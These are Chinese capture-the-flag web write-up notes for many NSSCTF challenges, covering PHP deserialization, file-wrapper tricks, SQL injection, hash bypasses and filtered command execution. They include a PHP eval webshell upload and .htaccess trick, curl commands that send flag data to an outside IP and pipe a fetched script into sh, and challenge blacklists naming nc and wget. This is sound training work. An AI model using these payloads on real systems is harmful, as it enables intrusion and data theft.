---
title: "web"
draft: false
---
## P17 \[强网杯 2019]随便注

dabukai

## P22 \[ZJCTF 2019]NiZhuanSiWei

```cpp
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

text直接data协议输入进去，`data://text/plain,welcome%20to%20the%20zjctf`

file可以php://filer协议获取，`php://filter/read=convert.base64-encode/resource=useless.php`

至于为什么是useless.php,看提示

```cpp
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

`__tostring`是在将类转换为字符串的时候出发的

可以发现在这里可以发现在上文中存在echo这个输出，所以触发了`__tostring`

可以构造payload注入进去，但是有一个前提，需要有`Flag`这个类才能出发，所以把之前的`include`改成包括`useless.php`，然后将后文改成`php://filter/read=convert.base64-encode/resource=flag.php`

最终payload：`text=data://text/plain,welcome%20to%20the%20zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}`

```cpp
<br>oh u find it </br>

<!--but i cant give it to u now-->

<?php

if(2===3){  
	return ("NSSCTF{bd5a3a11-746b-4c13-8915-ddb1b8a966b8}");
}

?>
```

## <font style="color:rgb(0, 0, 0);">P316 \[第五空间 2021]WebFTP</font>

![1764809363581-16493624-e8d6-4c47-99b3-09626c645648.png](./img/sP6fq2n3ZbmMzTLH/1764809363581-16493624-e8d6-4c47-99b3-09626c645648-594485.png)

开局直接给你一个登陆界面，但问题是sql注入不进去，看源代码看不出来信息，先dirsearch.py扫描一下

![1764809452985-fcd4abbf-f761-49a3-82fe-5fd460085efa.png](./img/sP6fq2n3ZbmMzTLH/1764809452985-fcd4abbf-f761-49a3-82fe-5fd460085efa-934735.png)

能扫描到一个/README.md，那就打开看一下

```cpp
使用说明
1、初始账号
	超级管理员 admin 密码 admin888
```

那这我不直接登录看看

然后在phpinfo.php这个文件能够查看flag

## <font style="color:rgb(0, 0, 0);">P382 \[NSSCTF 4th]EzCRC\[SWPUCTF 2021 新生赛]jicao</font>

```cpp
<?php
highlight_file('index.php');
include("flag.php");
$id=$_POST['id'];
$json=json_decode($_GET['json'],true);
if ($id=="wllmNB"&&$json['x']=="wllm")
{echo $flag;}
?>
```

直接写就行了

考察一下json格式是什么样子的，其实就是列表

```cpp
json={"x":"wllm"}
```

## <font style="color:rgb(0, 0, 0);">P383 \[SWPUCTF 2021 新生赛]caidao</font>

直接蚁剑链接就行

## <font style="color:rgb(0, 0, 0);">P385 \[SWPUCTF 2021 新生赛]Do\_you\_know\_http</font>

感觉没有什么价值，只有知道一下功能

第一显示要求用WLLM启动器，直接把UA改了就行了

然后是要求从本地访问，加上一个`x-forwarded-for:127.0.0.1`就可以了，并没有要求具体放在那里

## <font style="color:rgb(0, 0, 0);">P386 \[SWPUCTF 2021 新生赛]easy\_md5</font>

```cpp
<?php 
 highlight_file(__FILE__);
 include 'flag2.php';
 
if (isset($_GET['name']) && isset($_POST['password'])){
    $name = $_GET['name'];
    $password = $_POST['password'];
    if ($name != $password && md5($name) == md5($password)){
        echo $flag;
    }
    else {
        echo "wrong!";
    }
 
}
else {
    echo 'wrong!';
}
?>
```

直接数组绕过或者==科学计数法若比较绕过

## <font style="color:rgb(0, 0, 0);">P387 \[SWPUCTF 2021 新生赛]easy\_sql</font>

打开提示注入是wllm，直接注入就行了

`1'or'1'='1`可以注入，那就构建一个语句

`0'or()or'0`

这个语句能成功的注入，直接成功

## <font style="color:rgb(0, 0, 0);">P424 \[SWPUCTF 2021 新生赛]easyrce</font>

```cpp
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['url']))
{
eval($_GET['url']);
}
?>
```

。。。

## <font style="color:rgb(0, 0, 0);">P427 \[SWPUCTF 2021 新生赛]include</font>

```cpp
传入一个file试试
```

这个就是题面

这个指的是将file作为一个参数传进去的意思

```cpp
<?php
ini_set("allow_url_include","on");
header("Content-type: text/html; charset=utf-8");
error_reporting(0);
$file=$_GET['file'];
if(isset($file)){
    show_source(__FILE__);
    echo 'flag 在flag.php中';
}else{
    echo "传入一个file试试";
}
echo "</br>";
echo "</br>";
echo "</br>";
echo "</br>";
echo "</br>";
include_once($file);
?>
```

然后直接php伪协议绕过

<code><font style="color:rgb(51, 51, 51);">file</font>=php://filter/convert.base64-encode/resource=flag.php</code>

## P428 \[SWPUCTF 2021 新生赛]error

打开题目有一个注释，写的<code><font style="color:rgb(35, 110, 37);">SELECT * FROM users WHERE id='$id' LIMIT 0,1</font></code>，看起来是mysql的语句

<font style="color:rgb(0, 0, 0);">那就注入一下，但是</font><code><font style="color:rgb(0, 0, 0);">1'||'1'='1</font></code><font style="color:rgb(0, 0, 0);">显示没有提示</font>

<font style="color:rgb(0, 0, 0);">欸，不对，可不可能是因为过滤了</font>

<font style="color:rgb(0, 0, 0);">不过看他题面，他的思路应该是通过报错绕过</font>

<font style="color:rgb(0, 0, 0);">先不使用sqlmap，自己尝试换一下</font>

<font style="color:rgb(0, 0, 0);">时间盲注注入不进去</font>

<font style="color:rgb(0, 0, 0);">发现</font><code><font style="color:rgb(0, 0, 0);">1'and'1'='1</font></code><font style="color:rgb(0, 0, 0);">和</font><code><font style="color:rgb(0, 0, 0);">1'and'0'='1</font></code><font style="color:rgb(0, 0, 0);">的结果是不一样的，说明可以布尔盲注</font>

<font style="color:rgb(0, 0, 0);">尝试布尔盲注的时候发现出现了另一种情况</font>

```cpp
id：1'and(ord(substr((SELECT(schema_name)FROM(information_schema.schemata)),1,1))>37)and'1


Subquery returns more than 1 row
```

显示选择的输出长度大于一行，但是还是可以注入

但是这里大于小于都会显示输出有东西，不知道为什么

不是，空值也能判定为有相同值？你是认真的？

那么应该是报错注入

<code>_order by n_</code>*可以查看第n行的数据*

试一下有几列，`1' order by 4--+`的时候就报错了，所以可以确定有三列

那么可以报错注入`-1' union select 1,extractvalue(1,concat(0x7e,(select database()))),3#`或者`-1' and 1=extractvalue(1,concat(0x7e,(select database())))#`

这里其实是联合注入，因为之前发现能显示出结果

<code><font style="color:rgb(0, 0, 0);">XPATH syntax error: '~test_db'</font></code>

<font style="color:rgb(0, 0, 0);">然后查表名</font>

`-1' and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))#`

然后查列名

`-1' and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='test_tb'))) #`

最后直接输出

`-1' and 1=extractvalue(1,concat(0x7e,(select group_concat(id,'',flag) from test_tb)))#`

因为默认只能输出32个字符，所以使用`substring`来进行输出

`-1' and 1=extractvalue(1,concat(0x7e,(select substring(group_concat(id,'',flag),25,30) from test_tb)))#`

行了，尝试一下sqlmap直接爆破

![1765045235908-044a6403-3f48-4958-a620-1d149d962106.png](./img/sP6fq2n3ZbmMzTLH/1765045235908-044a6403-3f48-4958-a620-1d149d962106-557759.png)

也能直接爆破出来

## <font style="color:rgb(0, 0, 0);">P429 \[SWPUCTF 2021 新生赛]no\_wakeup</font>

*派蒙可爱捏~(￣▽￣)~\**

```cpp
<?php

header("Content-type:text/html;charset=utf-8");
error_reporting(0);
show_source("class.php");

class HaHaHa{


        public $admin;
        public $passwd;

        public function __construct(){
            $this->admin ="user";
            $this->passwd = "123456";
        }

        public function __wakeup(){
            $this->passwd = sha1($this->passwd);
        }

        public function __destruct(){
            if($this->admin === "admin" && $this->passwd === "wllm"){
                include("flag.php");
                echo $flag;
            }else{
                echo $this->passwd;
                echo "No wake up";
            }
        }
    }

$Letmeseesee = $_GET['p'];
unserialize($Letmeseesee);

?>
```

反序列化就行了

肉眼可见，sha1碰撞并不可取，所以只能绕过

<code><font style="color:rgb(0, 0, 0);">O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:6:"wllm";}</font></code>

<font style="color:rgb(0, 0, 0);">注意php反序列化中如果字符串中记录的字符数量和后面大括号中的字符数量会跳过wakeup的使用</font>

## P436 \[SWPUCTF 2021 新生赛]easyupload3.0

能看见文件上传路径，那就直接上传

```cpp
------WebKitFormBoundarywBU8EHcFAnRpwv3E
Content-Disposition: form-data; name="uploaded"; filename="1.png"
Content-Type: application/octet-stream

<?php
	eval($_POST['a']);
?>
------WebKitFormBoundarywBU8EHcFAnRpwv3E
```

```cpp
<meta charset="utf-8">./upload/1.png succesfully uploaded!
```

能上传上去，但是打开以后没有解析，说明没有对于png文件进行解析

那么尝试上传两种文件，一个是.user.ini，另一个是.htaccess文件

发现.user.ini成功上传了，但是没有成功，不知道为什么，可能已经默认配置了

那就上传.htaccess文件

```cpp
------WebKitFormBoundarywBU8EHcFAnRpwv3E
Content-Disposition: form-data; name="uploaded"; filename=".htaccess"
Content-Type: application/octet-stream

AddType application/x-httpd-php .txt
------WebKitFormBoundarywBU8EHcFAnRpwv3E
```

很好，注入成功了，程序也可以用

那就直接蚁剑连接拿flag

## P438 \[SWPUCTF 2021 新生赛]finalrce

```cpp
<?php
highlight_file(__FILE__);
if(isset($_GET['url']))
{
    $url=$_GET['url'];
    if(preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\"|\>|\<|\%|\$/i',$url))
    {
        echo "Sorry,you can't use this.";
    }
    else
    {
        echo "Can you see anything?";
        exec($url);
    }
}
```

额，过滤了一堆，看一下过滤了什么东西

几乎把本地能用的都给过滤了，但是没有过滤curl

那么我就可以先自己搭建一个服务器，然后接受他传输过来的数据

直接安装一个宝塔面板，然后下载nginx和php，接受一下公网地址就行了

```cpp
wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh && sudo bash install.sh
```

然后在宝塔中间搭建一个服务器，然后直接输出就行了

```cpp
<?php
    $x=$_GET['a'];
    file_put_contents("out.txt", $x);
?>
```

然后构建命令就行了

`?url=curl http://43.129.80.234/?a=`tac /flag\`\`

这个里面\`\`\`的作用是先执行里面的语句，就是将flag的内容都倒叙输入进去

这个里面可以使用的指令还剩`tac`、`tail`、`head`

但是问题是他没有回显，所以我选择直接将数据外带到服务器中执行

他还不能有la这个东西，但是flag里面必须有，所以我选择直接将命令写在服务器里面，通过通道输入到sh命令中，然后再执行

发现因为需要回显，所以需要新的php代码与payload

```cpp
<?php 
// error_reporting(0); 
// if (isset($_GET['a'])) {
// $a = $_GET['a'];
// file_put_contents("out.txt", $a); // } 
// else if(isset($_GET['x'])){ 
// file_put_contents("cmd.txt",$_GET['x']); 
// exec("curl 'http://node4.anna.nssctf.cn:28233/?url=curl http://43.129.80.234/?a=curl http://43.129.80.234/ | sh'"); 
// } 
// else { 
// $x=file_get_contents("cmd.txt"); 
// echo $x; 
// } error_reporting(0);
if (isset($_GET['a'])) { 
    $a = $_GET['a']; 
    file_put_contents("out.txt", $a . PHP_EOL, FILE_APPEND);
} 
else{
    echo "tac ../../../flllllaaaaaaggggggg";
} 
?>
```

`?url=curl [http://43.129.80.234/?a=`curl]\(http://43.129.80.234/?a=\`curl) <http://43.129.80.234/> | sh\`\`

好了，拿到了flag

## P439 \[SWPUCTF 2021 新生赛]hardrce

无参rce

```cpp
<?php
header("Content-Type:text/html;charset=utf-8");
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['wllm']))
{
    $wllm = $_GET['wllm'];
    $blacklist = [' ','\t','\r','\n','\+','\[','\^','\]','\"','\-','\$','\*','\?','\<','\>','\=','\`',];
    foreach ($blacklist as $blackitem)
    {
        if (preg_match('/' . $blackitem . '/m', $wllm)) {
        die("LTLT说不能用这些奇奇怪怪的符号哦！");
    &#125;&#125;
if(preg_match('/[a-zA-Z]/is',$wllm))
{
    die("Ra's Al Ghul说不能用字母哦！");
}
echo "NoVic4说：不错哦小伙子，可你能拿到flag吗？";
eval($wllm);
}
else
{
    echo "蔡总说：注意审题！！！";
}
```

正常情况下这种东西一般用异或或者取反进行过滤，其中异或是通过使用^和\`进行过滤，取反是~绕过，还可以自增绕过

***注意一下PHP7中会先尝试将字符作为变量，然后作为字符串，但是在PHP8中只会尝试将字符作为变量，不会作为字符串使用，所以这种方式只能在php7的环境中使用***

过滤了很多，而且连字母都用不了，但是通过身体可以发现其中第二个字母的正则判断仅仅限制了单行，所以尝试换行

尝试两个字符

垂直制表符：<code>**\x0b**</code>**（URL 编码 **<code>**%0b**</code>**）**

换页符：<code>**\x0c**</code>**（URL 编码 **<code>**%0c**</code>**）**

发现不行，说明没有字符能进行单行的绕过，那么就是取反或者是异或，但是异或被禁掉了，所以只能用取反来进行绕过

```cpp
def generate_not_url_expr(raw: str) -> str:
    """
    对 raw 中的每个字符按位取反 (~) 并限制在 1 字节内，
    然后以 %XX 的 URL 形式输出，整体包装成：
        !(%xx%xx%xx...)

    参数：
        raw: 原始字符串，例如 "system('ls');"

    返回：
        形如 "!(%AA%BB%CC...)" 的字符串
    """
    # 1. 对每个字符取反，得到字节列表
    encoded_bytes = [(~ord(ch)) & 0xFF for ch in raw]

    # 2. 转成 %XX 形式（大写十六进制）
    url_encoded = ''.join(f'%{b:02X}' for b in encoded_bytes)

    # 3. 包装成 !(%xx...)
    return f"(~{url_encoded})"


if __name__ == "__main__":
    raw_str = """phpinfo();"""  # 需要取反的字符串
    expr = generate_not_url_expr(raw_str)
    print(expr)

```

最后直接执行就行了

最终payload：`(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);`

## P440 \[SWPUCTF 2021 新生赛]pop

```cpp
<?php

error_reporting(0);
show_source("index.php");

class w44m{

    private $admin = 'aaa';
    protected $passwd = '123456';

    public function Getflag(){
        if($this->admin === 'w44m' && $this->passwd ==='08067'){
            include('flag.php');
            echo $flag;
        }else{
            echo $this->admin;
            echo $this->passwd;
            echo 'nono';
        }
    }
}

class w22m{
    public $w00m;
    public function __destruct(){
        echo $this->w00m;
    }
}

class w33m{
    public $w00m;
    public $w22m;
    public function __toString(){
        $this->w00m->{$this->w22m}();
        return 0;
    }
}

$w00m = $_GET['w00m'];
unserialize($w00m);

?>
```

看上去很好理解，但是问题来了，我上哪里去触发这个getflag啊？

首先22可以触发销毁代码，执行

但是这个执行是输出，不能执行11的getflag，只能执行33的`__toString`方法

那就通过33的方法执行11的代码

是写一个链子来进行

```cpp
w22m.__destruct().w00m->w33m.__toString().w00m->w44m.Getflag()
```

构建一个链子的代码：

```cpp
<?php

class w44m{

    private $admin = 'w44m';
    protected $passwd = '08067';

}

class w22m{
    public $w00m;
}

class w33m{
    public $w00m;
    public $w22m;

}
# w22m.__destruct().w00m->w33m.__toString().w00m->w44m.Getflag()
$a = new w22m();
$b = new w33m();
$c = new w44m();
# 入口
$a->w00m=$b;
# 链子
$b->w00m=$c;
$b->w22m='Getflag';
echo urlencode(serialize($a));
?>

```

注意构建链子的时候需要将变量指向相应的类，这样才能构建链子

## <font style="color:rgb(0, 0, 0);">P441 \[SWPUCTF 2021 新生赛]PseudoProtocols</font>

直接打开，只有一个参数，不是到上传些什么东西

那就伪协议输入

php://filter/read=convert.base64-encode/resource=hint.php

然后输出一串字符串，让我们跳转到/test2222222222222.php

```cpp
<?php
ini_set("max_execution_time", "180");
show_source(__FILE__);
include('flag.php');
$a= $_GET["a"];
if(isset($a)&&(file_get_contents($a,'r')) === 'I want flag'){
	echo "success\n";
	echo $flag;
}
?>
```

`file_get_contents($a,'r')`

关注这个函数

说是读取一个文件，但是可以data伪协议直接把我想要的东西送进去

`data://text/plain,I want flag`

## P442 \[SWPUCTF 2021 新生赛]sql

测试一下什么能输入，什么不能输入

发现`=`和`--+`被过滤了，那就直接二分法，其他没有什么过滤的

注意在爆破包名的时候可以使用`like`和`in`来进行判断

发现`substr`被过滤了，可以使用`mid`，`substring`，`left`和`right`来过滤

注意`left`和`right`都是取第几个字符，只有两个参数

发现`and`也被过滤了，那就用`or`

## P713 \[BJDCTF 2020]easy\_md5

打开看到是一个界面，什么都不知道，看一下源代码

什么也没有，但是抓包有提示

`select * from 'admin' where password=md5($pass,true)`

看起来就是源代码

当传入`password=ffifdyop`时：

* 先对`ffifdyop`做`md5(...,true)`加密，得到**二进制串**，再转成字符串会变成：`'or'6<乱码>`
* 此时 SQL 语句会被拼接成：**sql**

```sql
select * from admin where password=''or'6<乱码>'
```

其中`''or'6...` 是**永真条件**（因为`or`只要一侧为真，整个条件就为真），所以这条 SQL 会直接查询出`admin`表的所有数据，实现绕过验证。

`129581926211651571912466741651878684928`也行

显示`window.location.replace('./levels91.php')`

还有下一道题目，额

```cpp
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    header('Location: levell14.php');
```

他是不是写错了，但是反正我没尝试，因为a应该是空

```cpp
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
}
```

ok了，然后就是再见正经的md5碰撞了

这里面不是弱比较，所以只能数组绕过

`param1[]=1&param2[]=2`

flag出来了，不容易啊

## P718 \[BJDCTF 2020]Ezphp

打开看到是一个界面，但是找不到flag在哪里

直接dirsearch扫描一下，发现flag.php

打开这个界面看一下

不对，找一下其他内容

发现在index.html中有一个注释，告诉我们在1nD3x.php里面看

```php
<?php
  highlight_file(__FILE__);
error_reporting(0); 

$file = "1nD3x.php";
$shana = $_GET['shana'];
$passwd = $_GET['passwd'];
$arg = '';
$code = '';

echo "<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>";

if($_SERVER) { 
  if (
    preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
  )  
    die('You seem to want to do something bad?'); 
}

if (!preg_match('/http|https/i', $_GET['file'])) {
  if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
    $file = $_GET["file"]; 
    echo "Neeeeee! Good Job!<br>";
  } 
} else die('fxck you! What do you want to do ?!');

if($_REQUEST) { //所有参数里面不能含有英文字母
                foreach($_REQUEST as $value) { 
                  if(preg_match('/[a-zA-Z]/i', $value))  
                    die('fxck you! I hate English!'); 
                } 
              } 

if (file_get_contents($file) !== 'debu_debu_aqua')
  die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");


if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
  extract($_GET["flag"]);
  echo "Very good! you know my password. But what is flag?<br>";
} else{
  die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}

if(preg_match('/^[a-z0-9]*$/isD', $code) || 
   preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
  die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
  include "flag.php";
  $code('', $arg); 
} ?>
```

```php
if($_SERVER) { 
  if (
    preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
  )  
    die('You seem to want to do something bad?'); 
}
```

$\_SERVER\['QUERY\_STRING']是`?`后面的所有字符

\_SERVER的get传入不会先被转译，所以我们可以用url编码这些关键词绕过

```php
if (!preg_match('/http|https/i', $_GET['file'])) {
  if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
    $file = $_GET["file"]; 
    echo "Neeeeee! Good Job!<br>";
  } 
} else die('fxck you! What do you want to do ?!');
```

之后是传参，只要注意会检测`=`号，其他的直接转换成url编码就行了

这里正则表达式写的是匹配开头和行结尾，所以只需要加一个换行符即`%0a`就行了

```php
if($_REQUEST) {
  foreach($_REQUEST as $value) { 
    if(preg_match('/[a-zA-Z]/i', $value))  
      die('fxck you! I hate English!'); 
  } 
} 
```

`_REQUEST`同时接收GET和POST的传参，但POST拥有更高的优先级，所以只需要POST相同的参数即可绕过。

如果传入不进去的话把cookie删掉，就传的进去了，不删掉cooki会检测出英文

补充一下，程序运行的步骤是php编译器先解析出来GET的值，这个时候已经解析过了url编码，但是程序调用$\_REQUEST的时候调用的是原始的字符串，会调用出来未解码的字符串

```php
if (file_get_contents($file) !== 'debu_debu_aqua')
  die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");
```

要求file是`debu_debu_aqua`

可以直接通过data编码输入，即`data://text/plain,debu_debu_aqua`

注入进去了，看下一个

```php
if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
  extract($_GET["flag"]);
  echo "Very good! you know my password. But what is flag?<br>";
} else{
  die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}
```

这个就是哈希值的问题，直接数组绕过就可以

```php
if(preg_match('/^[a-z0-9]*$/isD', $code) || 
   preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
  die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
  include "flag.php";
  $code('', $arg); 
}
```

code感觉直接不传入进去就可以了，arg过滤了一堆

我到这里就不会了，所以选择直接看大佬的题解

首先在php里面，如果传入?flag\[code]=a\&flag\[arg]=b

那么在调用的时候就会发现

```php
$_GET['flag'] = [
  'code' => 'a',
  'arg'  => 'b'
];

```

回到题目中的extract的函数，这个函数的作用是根据字典的键值对拖出来变量

所以执行完成`extract($_GET["flag"]);`之后就可以获得两个变量，等价于如下

```php
$code = $_GET['flag']['code']; // a
$arg  = $_GET['flag']['arg'];  // b
```

然后 $code('', $arg);  执行的就是将变量名作为函数调用，想调用什么就调用什么

那么我选择直接phpinfo，之后不需要传入什么参数

先记录一下我的payload

```php
%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%66%6c%61%67%5b%63%6f%64%65%5d=%70%68%70%69%6e%66%6f&%66%6c%61%67%5b%61%72%67%5d=&%73%68%61%6e%61[]=1&%70%61%73%73%77%64[]=2
debu=1&file=1&passwd=1&shana=1
```

发现不行，再看一下大佬的payload

`create_function('', $arg);`相当于`eval("function λ() { " . $arg . " }");`

所以可以提前闭合括号然后直接输出

code=create\_function

arg=}phpinfo();//

发现不行，要找一个可以绕过限制的arg来进行输出

所以可以选择`}var_dump(get_defined_vars());//`进行绕过

绕后就可以看到flag.php里面的所有变量，最后一个变量记录的是Baka, do you think it's so easy to get my flag? I hid the real flag in rea1fl4g.php 23333

那就换

但是限制太多了，不能直接获取到真的flag

选择用bs64绕过，但是include被禁用了，就用功能相同的require

require(base64_decode(cmVhMWZsNGcucGhw))

注意这里直接使用base64\_decode会被最开始的判断禁用掉，但是可以使用url编码直接过滤

找到的是一个fakeflag，你是在恶心我吗

这实际上只是“包含 `rea1fl4g.php`”，但 `rea1fl4g.php` 里面很可能会有类似 `unset($real_flag)` 或者不直接 echo 真 flag 的逻辑（题解里确实是这样），所以 “include/require 执行文件”并不保证你能看到真 flag。

更可靠的做法是：把文件当文本读出来（拿到源码后，真 flag 字符串再怎么 `unset` 也挡不住你“看见”它）。

unset是删除变量，就是说将变量设置以后删除，就读不出来了

所以需要直接 `php://filter/read=convert.base64-encode/resource=rea1fl4g.php` 读出来

直接取反一下就可以了

```php
<?php
$a = "p h p : / / f i l t e r / r e a d = c o n v e r t . b a s e 6 4 - e n c o d e / r e s o u r c e = r e a 1 f l 4 g . p h p";
$arr1 = explode(' ', $a);
echo "~(";
foreach ($arr1 as $key => $value) {
    echo "%" . bin2hex(~$value);
}
echo ")";

?>
```

还是抄大佬的题解，加了一点自己的理解，因为新手看不懂。。。

## P1093 \[GXYCTF 2019]BabySql

查看提示发现是`select * from user where username = '$name'`

看一下过滤了什么，发现过滤了`()`

那就想也不要想，盲注是不可能了

试一下admin为用户名，发现是正确的

然后试一下password，发现1'||'2'>'1明明在username里面可以，但是在password里面不可以

password不是sql语句，那么就直接尝试一下php的姿势

先尝试一下数组输入，这个是php中明显的漏洞

`md5() expects parameter 1 to be string, array given in <b>/var/www/html/search.php`

给提示了，说明应该是对他进行了md5操作

union有这样一个特性 如果查询不到的话会直接构建一个虚拟数据

所以我们利用它

name='union select 1,‘admin’,‘c4ca4238a0b923820dcc509a6f75849b’%23\&pw=1 c4ca4238a0b923820dcc509a6f75849b为1的md5加密值

## P1096 \[GXYCTF 2019]Ping Ping Ping

看眼提示，直接加上`;`绕过，执行系统命令就行了

输入空格会显示<code><font style="color:rgb(0, 0, 0);">fxck your space!</font></code>

<font style="color:rgb(0, 0, 0);">真文明啊，哪找一下shell命令中能代替空格的东西</font>

```cpp
%09
%0a
%0d  
%0c
/**/  
+
{$IFS}[$(IFS)]
$IFS$1
```

随便找一个绕过就行了

继续输入，发现过滤了flag，会显示<code><font style="color:rgb(0, 0, 0);">fxck your flag!</font></code>

<font style="color:rgb(0, 0, 0);">那就使用通配符</font>

<font style="color:rgb(0, 0, 0);">啊这，好像过滤了\*</font>

那就`;catIFS9`ls\`\`

linux中可以会先执行反引号中的内容

或者`?ip=127.0.0.1;a=f;cat$IFS$1$alag.php`也行
## P1378 [GKCTF 2021]CheckBot


## P1988 \[WUSTCTF 2020]朴实无华

打开只有一个网址，先扫面一下有什么东西

robots.txt告诉你有一个`/fAke_f1agggg.php`

这个鬼东西扫不出来任何提示啊，怎么整

```plain
HTTP/1.1 200 OK
Date: Mon, 12 Jan 2026 13:22:20 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/5.6.40
look_at_me: /fl4g.php
Content-Length: 22
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

flag{this_is_not_flag}
```

这个是/fAke\_f1agggg.php的相应包，能看见一个`look_at_me: /fl4g.php`

额，那就应该是路径

行了，终于找到路径了

根据intval()函数的使用方法，当函数中用字符串方式表示科学计数法时，函数的返回值是科学计数法前面的一个数，而对于科学计数法加数字则会返回科学计数法的数值

额，问了一下chatgpt，这个特性只存在于7.1之前的php，所以我在我的电脑上是复现不出来的

第2层绕过md5==md5(md5),寻找一个以0x开头的字符串s,并且md5(s)也是以0x开头的字符串。如：

0e215962017 的 md5 值也是由’0e’开头，在 PHP 弱类型比较中相等

0e215962017==md5(0e215962017)

最后一层就是绕过空格和cat，在shell命令中能当作空格用的可多了去了

至于cat直接用tac不行吗。。。

其实用c'a't也行

## P2011 \[NISACTF 2022]easyssrf

他都告诉你是ssrf了，还不直接试一下

输入`file://etc/passwd`尝试一下，发现输出<code><font style="color:rgb(52, 58, 64);">害羞羞，试试其他路径？</font></code>

<font style="color:rgb(52, 58, 64);">这个东西记录了账号数据和部分的目录，一般可以从中间看到一点信息</font>

<font style="color:rgb(52, 58, 64);">输入</font><code><font style="color:rgb(52, 58, 64);">http://127.0.0.1/flag</font></code><font style="color:rgb(52, 58, 64);">，可以看到提示说找/fl4g这个文件夹</font>

<font style="color:rgb(52, 58, 64);">所以可以使用</font><code><font style="color:rgb(52, 58, 64);">file:///fl4g</font></code>

```cpp
file:///fl4g 的快照如下：

你应该看看除了index.php，是不是还有个ha1x1ux1u.php
```

那就打开这个文件看一下，可以直接访问

```cpp
<?php

highlight_file(__FILE__);
error_reporting(0);

$file = $_GET["file"];
if (stristr($file, "file")){
  die("你败了.");
}

//flag in /flag
echo file_get_contents($file);
```

直接输入/flag就可以获取到了flag

## #P2026 \[NISACTF 2022]bingdundun~

看上去是一个文件上传，查看一下有什么东西可以用

他告诉我只能上传压缩包和图片，先上传一个压缩包试一下

ok，zip文件能过上传，上传目录在/var/www/html/e5f748661c570ea667974caa02387eda.zip

他会哈希掉你的名字，说明.user.ini和.htaccess应该是不行的

那么打开看一下是什么东西

耶嘿，能下载下来，那么就试一下能不能尝试一下软链接

能，成功力

## P2074 \[NSSCTF 2022 Spring Recruit]ezgame

有两个方法，第一种是查看源代码，发现他给的提示：<font style="color:rgb(35, 110, 37);">score more than 65 , i will give you flag</font>

然后再找一下score的变量名称叫什么，可以直接进他的js文件里面查找

找到了以后直接控制台命令scorePoint=70，然后结束游戏（打死三个黑兔子）就可以了

第二种方法是邪修做法，直接在js文件里面搜索NSS，就能找到flag

## P2146 \[NSSCTF 2022 Spring Recruit]easy Python

```plain
import string

def encode(string,string2):
    tmp_str = str()
    ret = str()
    bit_string_str = string.encode()
    remain = len( string ) % 3
    remain_str = str()
    for char in bit_string_str:
